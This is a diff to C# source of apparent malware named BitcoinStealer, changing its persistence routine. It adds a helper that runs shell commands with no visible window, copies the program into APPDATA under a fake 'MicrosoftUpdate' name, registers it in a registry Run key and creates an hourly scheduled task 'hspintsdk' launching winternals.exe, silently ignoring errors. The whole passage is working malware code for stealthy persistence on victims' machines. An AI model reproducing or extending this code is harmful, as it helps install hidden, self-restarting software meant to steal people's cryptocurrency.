@@ -26,6 +26,16 @@ namespace BitcoinStealer
                 FilePath[2] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\MicrosoftUpdate" + Config.FileName[2];
             }
         }
+        
+        public static void cmd(string command)
+        {
+            var process = new Process();
+            process.StartInfo = new ProcessStartInfo("cmd", "/C " + command);
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+            process.Start();
+        }
 
         public void PersistImplant()
         {
@@ -36,17 +46,16 @@ namespace BitcoinStealer
             rk.SetValue(Path.GetFileName(currfile), currfile);
             string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
             string dest = "%APPDATA%" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
-            System.IO.File.Copy(src,dest);
+            System.IO.File.Copy(src, dest);
             try
             {
-                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                {
-                    Arguments = "/create /tn hspintsdk /tr %APPDATA/MicrosoftUpdate/winternals.exe /SC hourly /mo 1"
-                    UseShellExecute = false,
-                    CreateNoWindow = true
-                };
+                cmd("schtasks.exe /create /tn hspintsdk /tr %APPDATA/MicrosoftUpdate/winternals.exe /SC hourly /mo 1");
+            }
+            catch (Exception)
+            {
+                //exception ignored
+            }
 
-                Process p = Process.Start(startInfo);
-                p.WaitForExit(1000);
-            }    
+                
         }
+    }
